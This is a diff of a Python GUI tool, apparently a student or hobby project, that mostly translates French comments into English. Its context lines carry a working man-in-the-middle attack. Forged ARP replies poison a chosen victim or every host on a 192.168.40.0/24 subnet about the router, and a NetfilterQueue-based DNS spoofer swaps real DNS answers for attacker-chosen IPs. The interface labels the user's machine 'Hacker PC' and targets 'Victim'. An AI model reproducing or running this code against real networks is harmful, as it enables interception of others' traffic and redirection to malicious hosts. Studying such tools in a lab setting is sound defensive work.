@@ -23,7 +23,7 @@ from PIL.ImageTk import PhotoImage
 from PIL import Image, ImageTk
 
 
-# ------------------------------------- main ----------------------------------------
+# ------------------------------------- MAIN ----------------------------------------
 
 routeur_ip=conf.route.route("0.0.0.0")[2] 
 x = sr1(ARP(pdst=routeur_ip), iface="eno1", timeout=2) 
@@ -93,23 +93,23 @@ class Tab1(Frame):
         self._frame = new_frame
         self._frame.pack()
  
-#---------------------------------------ARP 1 VICTIM------------------------------------------
+#--------------------------------------- ARP SPOOF 1 VICTIM ------------------------------------------
 
 class ARP_one(Frame):
     def __init__(self, master):
         
-        # Fermer appli + Nettoyer réseau
+        # Close application + restore network
 		def signal_handler():
 			canvas1.itemconfig("smile", image=img1)
 			iface=self.saisie_if.get()
 			victim_ip=self.saisie_vic.get()
-			#routeur_ip=conf.route.route("0.0.0.0")[2] ---------------- ERROR
+
 			x = sr1(ARP(pdst=victim_ip), iface=iface, timeout=2) 
 			victim_mac = x.hwsrc
 			x = sr1(ARP(pdst=routeur_ip), iface=iface, timeout=2)
 			routeur_mac = x.hwsrc
 
-			self.text_box.insert("end-1c", "\n [!] Restoration réseau de la victime [!]\n")
+			self.text_box.insert("end-1c", "\n [!] Restoring the victim's network [!]\n")
 			send(ARP(pdst=victim_ip, hwdst=victim_mac, psrc=routeur_ip, hwsrc=routeur_mac, op=2), count=5, inter=.2)
 			os.system("iptables -F")
 			app.destroy()
@@ -119,12 +119,12 @@ class ARP_one(Frame):
 			t2=Thread(target=signal_handler)
 			t2.start()           
 
-		# Lancement arp
+		# ARP launch
 		def threading1():
 			t1=Thread(target=single)
 			t1.start()
 			
-			# GUI VICTIMES
+			# GUI VICTIMS
 			canvas = self.canvas
 			gui_pc = self.gui_pc
 			victim_ip=self.saisie_vic.get()
@@ -132,13 +132,13 @@ class ARP_one(Frame):
 			iface=self.saisie_if.get()
 			x = get_if_addr(iface)
 			
-			#PC attaquant
+			# Hacker PC 
 			item=canvas.create_image((250, 50), anchor=CENTER, image=hacker_pc, tag="hacker_pc")
 			canvas.itemconfig("hacker_pc", image=hacker_pc)
 			text=canvas.create_text((250, 120), anchor=CENTER, text=x, tag="gui_ip", fill="red")
 			canvas.itemconfig("gui_ip")
 			
-			#PC victime
+			# Victim PC
 			item=canvas.create_image((550, 50), anchor=CENTER, image=gui_pc, tag="gui_vic")
 			canvas.itemconfig("gui_vic", image=gui_pc)
 			text=canvas.create_text((550, 120), anchor=CENTER, text=y, tag="gui_ip", fill="white")
@@ -147,14 +147,14 @@ class ARP_one(Frame):
 			canvas.pack()
             
 		def single():
-			# Voyant vert
+			# Green light
 			canvas1.itemconfig("smile", image=img2)
 			#sniff(filter="arp and host " + routeur_ip, prn=arp_sniffing1)
 			sniff(prn=general_sniffing1)
             
 		def arp_spoof1():
-			iface=self.saisie_if.get() # recup de l'interface
-			victim_ip=self.saisie_vic.get() # recup de l'adresse IP victime
+			iface=self.saisie_if.get() # get interface 
+			victim_ip=self.saisie_vic.get() # get victim ip
 			self.victim_ip = victim_ip
 			ethernet = Ether()
 			arp = ARP(pdst=victim_ip, psrc=routeur_ip, op="is-at")
@@ -163,8 +163,8 @@ class ARP_one(Frame):
 			packet1 = ethernet / arp1
 			sendp(packet, iface=iface)
 			sendp(packet1, iface=iface)
-			self.text_box.insert("end-1c", "[*]SPOOF ARP VICTIME \n")
-			self.text_box.insert("end-1c", "[*]SPOOF ARP ROUTEUR \n")
+			self.text_box.insert("end-1c", "[*]SPOOF ARP VICTIM \n")
+			self.text_box.insert("end-1c", "[*]SPOOF ARP ROUTER \n")
 			
 			self.spoof=canvas.create_line(320,45,480,45, arrow=tk.LAST, fill="green", width="7")
 			time.sleep(2)
@@ -172,7 +172,7 @@ class ARP_one(Frame):
 
 		def arp_sniffing1(pkt):
 			if pkt[ARP].op == 1:  # is-at (response)
-				self.text_box.insert("end-1c","\n\n[i] Réponse : ( {0} ) adresse : ( {1} )\n".format(pkt[ARP].hwsrc, pkt[ARP].psrc))
+				self.text_box.insert("end-1c","\n\n[i] Response : ( {0} ) MAC address : ( {1} )\n".format(pkt[ARP].hwsrc, pkt[ARP].psrc))
 			arp_spoof1()
     
 		def general_sniffing1(pkt):
@@ -234,7 +234,7 @@ class ARP_one(Frame):
 		self.saisie_if = Entry(self, width=20, cursor="dotbox")
 		self.saisie_if.pack()
 
-		# ESPACES
+		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 
@@ -245,7 +245,7 @@ class ARP_one(Frame):
 		self.saisie_vic.pack()
 
 
-		# ESPACES
+		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		self.label= Label(self, text="", bg="black")
@@ -269,7 +269,7 @@ class ARP_one(Frame):
 		self.label.pack()
 		self.b_stop.pack()
 
-		# ESPACES
+		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		self.label_att.pack()
@@ -278,11 +278,11 @@ class ARP_one(Frame):
 		self.label.pack()
 		self.multiuser.pack()
 
-		# VOYANTS
+		# LIGHTS
 		img2 = ImageTk.PhotoImage(Image.open("green.png"))
 		img1 = ImageTk.PhotoImage(Image.open("red.png"))
 
-		#ESPACE
+		# SPACE
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 
@@ -290,11 +290,11 @@ class ARP_one(Frame):
 		canvas1.pack()
 		canvas1.create_image((50, 50), image=img1, tag="smile")
         
-		# GUI VICTIME
+		# GUI VICTIM
 		gui_pc = ImageTk.PhotoImage(Image.open("victim.png"))
 		hacker_pc = ImageTk.PhotoImage(Image.open("hacker.png"))
 
-		# ESPACES 
+		# SPACES 
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
        
@@ -307,7 +307,7 @@ class ARP_one(Frame):
 class ARP_all(Frame):
 	def __init__(self, master):
         
-        # Fermer appli + Nettoyer réseau
+        # Close application + restore network
 		def signal_handler_all():
 			canvas1.itemconfig("smile", image=img1)
 			iface=self.saisie_if.get()
@@ -316,34 +316,34 @@ class ARP_all(Frame):
 			x = sr1(ARP(pdst=routeur_ip), iface=iface, timeout=2)
 			routeur_mac = x.hwsrc
 
-			print('\n [!] Restoration réseau de la victime')
+			print('\n [!] Restoring victim network')
 			send(ARP(pdst=victim_ip, psrc=routeur_ip, hwsrc=routeur_mac, op=2), count=5, inter=.2)
 			os.system("iptables -F")
 			app.destroy()
 			
-		# Lancement arp all
+		# ARP all launch
 		def threading2():
 			t1=Thread(target=arp_all)
 			t1.start()
 			
 		def arp_sniffing2(pkt):
 			if pkt[ARP].op == 1:  # is-at (response)
-				#print('\n\n[i] Réponse : ( {0} ) adresse : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
+				#print('\n\n[i] Response : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
 				arp_spoof2()
 		
 		def arp_all():
 			sniff(filter="arp and host "+routeur_ip, prn=arp_sniffing2)
 			
 		def arp_spoof2(): 
-			# Voyant vert
+			# Green light
 			canvas1.itemconfig("smile", image=img2)
 			victim_ip="192.168.40.0/24"
 			
-			# Création paquet ARP
+			# Create ARP packet
 			arp = ARP(pdst=victim_ip)
 			
-			# Créer le paquet Broadcast Ether
-			# ff:ff:ff:ff:ff:ff c'est le broadcast (MAC)
+			# Create Broadcast Ether ether
+			# ff:ff:ff:ff:ff:ff broadcast (MAC addr)
 			ether = Ether(dst="ff:ff:ff:ff:ff:ff")
 			
 			packet = ether/arp
@@ -351,13 +351,13 @@ class ARP_all(Frame):
 			
 			victimes = []
 			gui_victimes = []
-			# Obtenir toutes les adresses MAC du réseau + les spoofer
+			# Get all IP and MAC address of the network + spoof them
 			for sent, received in result:
-			# Pour chaque réponse, on ajoute ip et mac à la liste `victimes` et 'gui_victimes'
+			# For each answer, we add IP and MAC address to `victims` and 'gui_victims' lists
 				victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
 				gui_victimes.append(received.psrc)
 				
-			# On affiche toutes les victimes du réseaus
+			# Display all network victims
 			self.text_box.insert("end-1c", "\nEQUIPEMENTS CONNECTÉS AU RÉSEAU\n")
 			self.text_box.insert("end-1c", "IP" + " "*18+"MAC\n")
 			for x in victimes:
@@ -399,23 +399,23 @@ class ARP_all(Frame):
 				
 			ethernet = Ether()
 			for x in victimes:
-				if x['ip']==routeur_ip: #On supprime l'adresse IP du routeur car on ne veut pas lui envoyer de packet ARP
+				if x['ip']==routeur_ip: # Deleting router IP address because we don't want to send it any ARP packet
 					del x['ip']
 				else:
 					arp = ARP(pdst=x['ip'], psrc=routeur_ip, op="is-at")
 					packet = ethernet / arp
 					sendp(packet, iface="eno1")
-					self.text_box.insert("end-1c","[*]Spoof ARP a ( {0} )\n".format(x['ip']))
+					self.text_box.insert("end-1c","[*]ARP Spoof to ( {0} )\n".format(x['ip']))
   
 		Frame.__init__(self, master)
 		
 		self.items = []
 		self.texts = []
 		self.singleuser = Button(self, text="► Single user ◄", command=lambda: master.switch_frame(ARP_one), bg="#f27c2c")
-		self.label_if = Label(self, text="☠ ARP Spoofer multi victimes ☠", font = ( "Courier" , 20 ), bg='#FF5544', pady=30, padx=120)
+		self.label_if = Label(self, text="☠ ARP Spoofer all network ☠", font = ( "Courier" , 20 ), bg='#FF5544', pady=30, padx=120)
 		self.label_if.pack()
 		
-		# ESPACES
+		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		self.label= Label(self, text="", bg="black")
@@ -427,7 +427,7 @@ class ARP_all(Frame):
 		self.saisie_if = Entry(self, width=20, cursor="dotbox")
 		self.saisie_if.pack()
 		
-		# ESPACES
+		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		self.label= Label(self, text="", bg="black")
@@ -435,13 +435,13 @@ class ARP_all(Frame):
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		
-		# TEXTBOX
+		# TEXTBOX DETAILS
 		self.dt = Label(self, text="Details about ARP Spoof", font = ( "Courier" , 11 ), bg='#FF5544')
 		self.dt.pack()
 		self.text_box = tk.Text(self, width = 50, height = 8)
 		self.text_box.pack()
 		
-		# ESPACES
+		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		
@@ -453,7 +453,7 @@ class ARP_all(Frame):
 		self.label.pack()
 		self.b_stop2.pack()
 		
-		# ESPACES
+		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		self.singleuser.pack()
@@ -461,7 +461,7 @@ class ARP_all(Frame):
 		self.label.pack()
 		
 		
-		#VOYANTS
+		# LIGHTS
 		img1 = ImageTk.PhotoImage(Image.open("red.png"))
 		img2 = ImageTk.PhotoImage(Image.open("green.png"))
 		canvas1 = tk.Canvas(self, width=100, height=100, bg="black", highlightthickness=0)
@@ -469,13 +469,13 @@ class ARP_all(Frame):
 		canvas1.create_image((50, 50), image=img1, tag="smile")
 		
 
-		#GUI VICTIME
+		# GUI VICTIM
 		gui_pc = ImageTk.PhotoImage(Image.open("victim.png"))
 		canvas = tk.Canvas(self, width=800, height=200, bg="black", highlightthickness=0)
 		self.gui_pc = gui_pc
 		self.canvas = canvas
 		
-		# ESPACES
+		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 
@@ -485,11 +485,12 @@ class ARP_all(Frame):
 class DNS_attk(Frame):
     def __init__(self, master):
 		
-		# Lancement fct DNS SPOOF
+		# Launch DNS SPOOF
         def threading_dns():
 			t1=Thread(target=dns_spoof)
 			t1.start()
-			# HACKER
+			
+			# HACKER PC
 			item=canvas.create_image((250, 50), anchor=CENTER, image=hacker_pc, tag="hacker_pc")
 			canvas.itemconfig("hacker_pc", image=hacker_pc)
 
@@ -507,7 +508,7 @@ class DNS_attk(Frame):
             I.E, whenever we see a google.com answer, this function replaces 
             the real IP address (172.217.19.142) with fake IP address (192.168.40.113)
             """
-            # ENTREES USER DNS NAME
+            # GET INPUT DNS NAME AND IP
             x = self.saisie_dnsname.get()
             y = self.saisie_dnsip.get()
             
@@ -592,13 +593,13 @@ class DNS_attk(Frame):
                 
         def dns_kill():
             
-            #IMPORTANT !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+            #IMPORTANT !!
             os.system("iptables -F")
             queue = NetfilterQueue()
             queue.unbind()
             self.text_box.insert("end-1c", "yo mama is so fat, she outweighted this application \n")
             
-            # VOYANT ROUGE
+            # RED LIGHT
             canvas1.itemconfig("smile", image=img1)
         
         Frame.__init__(self, master)
@@ -607,7 +608,7 @@ class DNS_attk(Frame):
         self.label_if.pack()
         self.label_att= Label(self, text="⚠️ You can't use DNS BEFORE ARP Spoofing ⚠️", bg="#9ceb72")
         
-        # ESPACES
+        # SPACES
         self.label= Label(self, text="", bg="black")
         self.label.pack()
         self.label= Label(self, text="", bg="black")
@@ -619,7 +620,7 @@ class DNS_attk(Frame):
         self.saisie_dnsname = Entry(self, width=20, cursor="dotbox")
         self.saisie_dnsname.pack()
         
-        # ESPACES
+        # SPACES
         self.label= Label(self, text="", bg="black")
         self.label.pack()
         
@@ -629,19 +630,19 @@ class DNS_attk(Frame):
         self.saisie_dnsip = Entry(self, width=20, cursor="spider")
         self.saisie_dnsip.pack()
         
-        # ESPACES
+        # SPACES
         self.label= Label(self, text="", bg="black")
         self.label.pack()
         self.label= Label(self, text="", bg="black")
         self.label.pack()
         
-        # TEXTBOX 
+        # TEXTBOX DETAILS
         self.dt = Label(self, text="Details about DNS Spoof", font = ( "Courier" , 11 ), bg='#adfd85')
         self.dt.pack()
         self.text_box = tk.Text(self, width = 50, height = 8)
         self.text_box.pack()
     
-		# ESPACES
+	# SPACES
         self.label= Label(self, text="", bg="black")
         self.label.pack()
         self.label_att.pack()
@@ -653,7 +654,7 @@ class DNS_attk(Frame):
         self.b_stop2=Button(self, text="Stop DNS", bg = "red" , fg = "black" , command = dns_kill)
         self.b_start2.pack()
         
-        # ESPACES
+        # SPACES
         self.label= Label(self, text="", bg="black")
         self.label.pack()
         
@@ -669,10 +670,10 @@ class DNS_attk(Frame):
         canvas1.pack()
         canvas1.create_image((50, 50), image=img1, tag="smile")
         
-        # ESPACES
+        # SPACES
         self.configure(bg="black")
         
-        # GUI VICTIME
+        # GUI VICTIM
         gui_pc = ImageTk.PhotoImage(Image.open("victim.png"))
         hacker_pc = ImageTk.PhotoImage(Image.open("hacker.png"))
         canvas = tk.Canvas(self, width=800, height=200, bg="black", highlightthickness=0)
@@ -688,7 +689,7 @@ class about_nc(Frame):
 		self.label_if = Label(self, text="         ☠ About ☠           ", font = ( "Courier" , 20 ), bg='red', pady=30, padx=128)
 		self.label_if.pack()
 		
-		# ESPACES
+		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		
@@ -697,15 +698,15 @@ class about_nc(Frame):
 		self.logo = ImageTk.PhotoImage(Image.open('logo.png'))
 		self.canvas_a.create_image(160,160,image=self.logo,anchor='se') 
 		
-		# ESPACES
+		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		
-		#Some text
+		# HELP text
 		self.dt = Label(self, text="Here are some help to get to know our tool : ", font = ( "Courier" , 13 ), bg='red')
 		self.dt.pack()
 
-		# ESPACES 
+		# SPACES 
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 
@@ -717,11 +718,11 @@ class about_nc(Frame):
 		self.canvas_a = tk.Canvas(self, width=400, height=150, bg="black", highlightthickness=0)
 		self.canvas_a.pack()
 		
-		# SPOOF
+		# SPOOF ARROW
 		self.spoof=self.canvas_a.create_text(100,35, text="SPOOF", font = ( "Courier" , 9  ), fill="green")
 		self.spoof=self.canvas_a.create_line(50,20,170,20, arrow=tk.LAST, fill="green", width="7")
 		
-		# ICMP 
+		# ICMP ARROW
 		self.icmp=self.canvas_a.create_text(300,35, text="Redirecting ICMP", font = ( "Courier" , 9  ), fill="purple")
 		self.arrow=self.canvas_a.create_line(355,20,235,20, arrow=tk.LAST, fill="purple", width="7")
 		
@@ -738,11 +739,11 @@ class about_nc(Frame):
 		self.canvas_b = tk.Canvas(self, width=400, height=100, bg="black", highlightthickness=0)
 		self.canvas_b.pack()
 		
-		# SPOOF
+		# SPOOF ARROW
 		self.dns=self.canvas_b.create_text(100,35, text="DNS Response from hacker", font = ( "Courier" , 9  ), fill="red")
 		self.dns=self.canvas_b.create_line(50,20,170,20, arrow=tk.LAST, fill="red", width="7")
 		
-		# ICMP 
+		# ICMP ARROW
 		self.icmp=self.canvas_b.create_text(300,35, text="DNS Request (client)", font = ( "Courier" , 9  ), fill="#99aaff")
 		self.arrow=self.canvas_b.create_line(355,20,235,20, arrow=tk.LAST, fill="#99aaff", width="7")
 		
